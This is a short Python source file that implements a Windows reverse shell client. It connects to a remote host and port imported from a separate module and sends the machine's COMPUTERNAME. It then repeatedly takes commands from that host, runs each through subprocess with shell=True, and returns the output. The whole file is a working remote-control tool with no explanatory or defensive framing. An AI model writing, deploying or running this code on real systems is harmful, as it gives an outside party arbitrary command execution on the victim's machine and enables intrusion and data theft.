import os
import socket
import subprocess
from data import HOST, PORT, ENCODING


def connect(host, port):
    os.system("cls")
    client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    try:
        print(f"[+] Trying to connect {host}: {port}")
        client.connect((HOST, PORT))
        print(f"[+] Conenction established.")
        client.send(os.environ["COMPUTERNAME"].encode(ENCODING))
    except socket.error as msg:
        print(f"[+] Connection error: {msg}.")
        client.close()
        os._exit(0)
    return client

def receive(client):
    try:
        response = client.recv(1024).decode(ENCODING)
    except ConnectionResetError as error:
        print(f"[+] Lost connection: {error}.")
        client.close()
        os._exit(0)
    if response == 'quit':
        client.close()
        print("[+] Exiting program...")
        os._exit(0)
    else:
        shell = subprocess.Popen(
            response, 
            shell=True, 
            stdout=subprocess.PIPE, 
            stderr=subprocess.PIPE, 
            stdin=subprocess.PIPE
            )
        stdout = shell.stdout.read() + shell.stderr.read()
        msg = str(stdout.decode('gbk')).encode(ENCODING)
        send(client, msg)

def send(client, msg):
    client.send(msg)
    receive(client)

client = connect(HOST, PORT)
receive(client)



